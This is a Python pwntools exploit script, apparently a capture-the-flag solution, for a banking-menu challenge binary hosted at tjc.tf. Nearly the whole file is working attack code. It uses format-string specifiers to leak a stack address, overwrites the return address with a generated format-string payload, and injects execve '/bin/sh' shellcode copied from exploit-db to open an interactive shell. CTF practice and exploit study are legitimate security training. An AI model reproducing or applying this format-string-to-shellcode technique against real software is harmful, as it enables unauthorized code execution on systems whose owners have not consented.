#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'tjc.tf', 31363

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    b *main+952
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    with log.progress('Finding ret address via fmstr leak rbp'), context.silent:
        input_buffer = int(io.recvline().split(b', ')[0], 16)
        io.sendlineafter(b'What would you like to do? (view balance|deposit|withdraw|transfer|exit) ', b'deposit')
        # Leak rbp
        if args.REMOTE:
            io.sendlineafter(b'Enter amount: ', b'%56$p')
        else:
            io.sendlineafter(b'Enter amount: ', b'%38$p')
        ret = int(io.recvline().strip(), 16) - 8 #rbp - 0x8 = ret address
    log.info('Ret: %#x', ret)
    log.info('Input buffer: %#x', input_buffer)
    log.info('Offset: %#x', ret - input_buffer)
    # Shellcode from exploitdb https://www.exploit-db.com/exploits/46907
    shellcode = asm('''
        xor     rsi, rsi
        push    rsi
        movabs  rdi, 0x68732f2f6e69622f
        push    rdi
        push    rsp
        pop     rdi
        push    0x3b
        pop     rax
        cltd
        syscall
    ''')
    log.info('Shellcode length: %d', len(shellcode))
    log.info('Shellcode: %s', shellcode.hex())
    with log.progress('Overwrite ret with input buffer address'), context.silent:
        target = input_buffer + 8
        writes = {ret : target}
        io.sendlineafter(b'What would you like to do? (view balance|deposit|withdraw|transfer|exit) ', b'deposit')
        io.sendlineafter(b'Enter amount: ', fmtstr_payload(12, writes, write_size='short'))
        
    with log.progress('Write shellcode in input buffer + 8 then exit'), context.silent:
        io.sendlineafter(b'What would you like to do? (view balance|deposit|withdraw|transfer|exit) ', b'deposit')
        io.sendlineafter(b'Enter amount: ', b"A"*8 + shellcode)
        io.sendlineafter(b'What would you like to do? (view balance|deposit|withdraw|transfer|exit) ', b'exit')
    io.interactive()

if __name__ == '__main__':
    exploit()
